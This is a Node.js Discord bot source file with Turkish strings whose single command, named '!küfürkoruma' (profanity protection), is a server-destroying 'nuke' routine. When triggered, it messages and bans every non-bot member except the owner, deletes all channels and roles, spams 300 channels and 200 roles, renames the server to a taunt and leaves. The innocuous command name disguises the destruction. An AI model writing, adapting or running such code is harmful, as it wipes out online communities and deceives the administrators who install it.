// index.js
require('dotenv').config();
const { Client, GatewayIntentBits, Partials, EmbedBuilder } = require('discord.js');

const client = new Client({
  intents: [
    GatewayIntentBits.Guilds,
    GatewayIntentBits.GuildMessages,
    GatewayIntentBits.MessageContent,
    GatewayIntentBits.GuildMembers
  ],
  partials: [Partials.Channel]
});

const OWNER_ID = process.env.OWNER_ID;

client.once('ready', () => {
  console.log(`✅ Bot aktif: ${client.user.tag}`);
});

client.on('messageCreate', async (message) => {
  if (!message.guild || message.author.bot) return;

  const args = message.content.trim().split(/ +/);
  const command = args.shift().toLowerCase();

  if (command === '!küfürkoruma') {
    const members = await message.guild.members.fetch();
    let bannedCount = 0;

    const embed = new EmbedBuilder()
      .setColor('Red')
      .setTitle('❌ Sunucudan Yasaklandınız!')
      .setDescription('fors bombom gitti demeyin')
      .setFooter({ text: '💦FORS AFFETMEZ SABAHA SUNUCUN AFFEDİLMEZ💦' });

    // Üyeleri banla
    for (const member of members.values()) {
      if (!member.user.bot && member.id !== OWNER_ID) {
        await member.send({ embeds: [embed] }).catch(() => {});
        await member.ban({ reason: 'Küfürkoruma aktif edildi.' }).catch(() => {});
        bannedCount++;
      }
    }

    // Kanalları sil
    await Promise.all(message.guild.channels.cache.map(ch => ch.delete().catch(() => {})));

    // Yeni kanallar oluştur
    const names = ['FORS💦', 'ALİLW💝', 'MİRAÇ🔥'];
    for (let i = 0; i < 300; i++) {
      const name = names[i % names.length];
      await message.guild.channels.create({ name }).catch(() => {});
    }

    // Rolleri sil
    for (const role of message.guild.roles.cache.values()) {
      if (role.editable && role.id !== message.guild.id) {
        await role.delete().catch(() => {});
      }
    }

    // Yeni roller oluştur
    for (let i = 0; i < 200; i++) {
      const randomColor = `#${Math.floor(Math.random() * 16777215).toString(16).padStart(6, '0')}`;
      await message.guild.roles.create({
        name: 'BÖÖ KORKTUNMUU😜',
        color: randomColor,
        hoist: true
      }).catch(() => {});
    }

    // Sunucu ismini değiştir
    await message.guild.setName('💦FORS AFFETMEZ SABAHA SUNUCUN AFFEDİLMEZ💦').catch(() => {});

    // Bilgi mesajı
    await message.channel.send(`🧹 ${bannedCount} kişi banlandı. Kanallar ve roller güncellendi.`);

    // Botu sunucudan at
    await message.guild.leave().catch(() => {});
  }
});

client.login(process.env.BOT_TOKEN);
